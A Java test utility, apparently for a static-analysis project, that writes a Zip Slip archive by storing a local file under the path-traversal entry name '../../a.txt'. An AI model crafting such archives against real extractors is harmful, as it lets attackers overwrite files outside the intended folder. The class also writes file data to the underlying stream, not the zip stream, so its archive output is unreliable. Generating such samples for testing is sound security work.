package com.nii.soot.zip;

import java.io.*;
import java.util.ArrayList;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

/**
 * 生成zip漏洞的测试类
 *
 * @author wzj
 * @create 2018-07-04 22:39
 **/
public class GenerateZipVulnTest
{
    public static void main(String[] args) throws IOException
    {
        List<String> fileList = new ArrayList<String>();
        fileList.add("C:\\Users\\wzj\\Desktop\\test\\1.txt");

        FileOutputStream fileOutputStream = new FileOutputStream(new File("C:\\Users\\wzj\\Desktop\\test\\test.zip"));

        generateZip(fileOutputStream,fileList);
    }


    public static void generateZip(OutputStream outputStream, List<String> fileList) throws IOException
    {
        ZipOutputStream zipOutputStream = null;

        byte[] buffer = new byte[1024];
        zipOutputStream = new ZipOutputStream(outputStream);

        for (String file : fileList)
        {
            FileInputStream inputStream = new FileInputStream(new File(file));
            zipOutputStream.putNextEntry(new ZipEntry("../../a.txt"));

            int len = 0;
            while ((len = inputStream.read(buffer)) != -1)
            {
                outputStream.write(buffer, 0, len);
            }

            zipOutputStream.flush();
            zipOutputStream.closeEntry();
            inputStream.close();
        }
    }
}
